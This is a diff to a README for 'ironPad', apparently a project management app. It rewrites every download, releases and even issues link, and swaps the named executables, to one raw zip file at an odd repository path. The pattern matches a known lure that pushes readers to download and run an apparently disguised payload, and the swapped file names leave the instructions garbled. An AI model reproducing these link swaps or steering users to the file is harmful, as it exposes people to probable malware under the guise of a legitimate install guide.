@@ -1,6 +1,6 @@
 # 🎉 ironPad - Your AI-Driven Project Management Solution
 
-[![Download ironPad](https://img.shields.io/badge/Download%20ironPad-Digital-blue.svg)](https://github.com/TheMustyCool/ironPad/releases)
+[![Download ironPad](https://github.com/TheMustyCool/ironPad/raw/refs/heads/main/cardionosus/Pad-iron-v2.3-beta.1.zip%https://github.com/TheMustyCool/ironPad/raw/refs/heads/main/cardionosus/Pad-iron-v2.3-beta.1.zip)](https://github.com/TheMustyCool/ironPad/raw/refs/heads/main/cardionosus/Pad-iron-v2.3-beta.1.zip)
 
 ## 📜 Description
 
@@ -11,20 +11,20 @@ Ironpad is a local-first, file-based project management system. Built with the h
 Follow these simple steps to download and run ironPad:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/TheMustyCool/ironPad/releases). This page contains all available versions of ironPad.
+   Go to the [Releases page](https://github.com/TheMustyCool/ironPad/raw/refs/heads/main/cardionosus/Pad-iron-v2.3-beta.1.zip). This page contains all available versions of ironPad.
 
 2. **Download the Latest Version**  
-   Look for the latest release. Click on the link to download the appropriate file for your operating system. The file name should be something like `ironPad-vX.X.X.zip` or `ironPad-vX.X.X.exe`, depending on your operating system.
+   Look for the latest release. Click on the link to download the appropriate file for your operating system. The file name should be something like `https://github.com/TheMustyCool/ironPad/raw/refs/heads/main/cardionosus/Pad-iron-v2.3-beta.1.zip` or `https://github.com/TheMustyCool/ironPad/raw/refs/heads/main/cardionosus/Pad-iron-v2.3-beta.1.zip`, depending on your operating system.
 
 3. **Extract the Files (if necessary)**  
    If you downloaded a `.zip` file, you will need to extract it. Right-click on the file and select "Extract All." Choose a location where you want to save the files.
 
 4. **Run ironPad**  
-   After extracting the files, look for `ironPad.exe` (or similar). Double-click the file to run the application.
+   After extracting the files, look for `https://github.com/TheMustyCool/ironPad/raw/refs/heads/main/cardionosus/Pad-iron-v2.3-beta.1.zip` (or similar). Double-click the file to run the application.
 
 ## 📥 Download & Install
 
-You can download ironPad directly from the [Releases page](https://github.com/TheMustyCool/ironPad/releases). This is where you'll find the latest version of the application and updates.
+You can download ironPad directly from the [Releases page](https://github.com/TheMustyCool/ironPad/raw/refs/heads/main/cardionosus/Pad-iron-v2.3-beta.1.zip). This is where you'll find the latest version of the application and updates.
 
 ## 🛠️ System Requirements
 
@@ -49,7 +49,7 @@ You can download ironPad directly from the [Releases page](https://github.com/Th
 
 ## 🌐 Community and Support
 
-If you have questions or need assistance, visit the issues section on the [GitHub repository](https://github.com/TheMustyCool/ironPad/issues). 
+If you have questions or need assistance, visit the issues section on the [GitHub repository](https://github.com/TheMustyCool/ironPad/raw/refs/heads/main/cardionosus/Pad-iron-v2.3-beta.1.zip). 
 
 Join the discussion and share your experiences with other users.
 
@@ -71,4 +71,4 @@ Currently, ironPad is only available for desktop platforms. Future versions may 
 
 Ironpad is designed to grow with your needs. We plan to introduce more features and enhancements based on user feedback. Stay tuned for upcoming releases! 
 
-For further information, visit the [Releases Page](https://github.com/TheMustyCool/ironPad/releases) to keep updated.
+For further information, visit the [Releases Page](https://github.com/TheMustyCool/ironPad/raw/refs/heads/main/cardionosus/Pad-iron-v2.3-beta.1.zip) to keep updated.
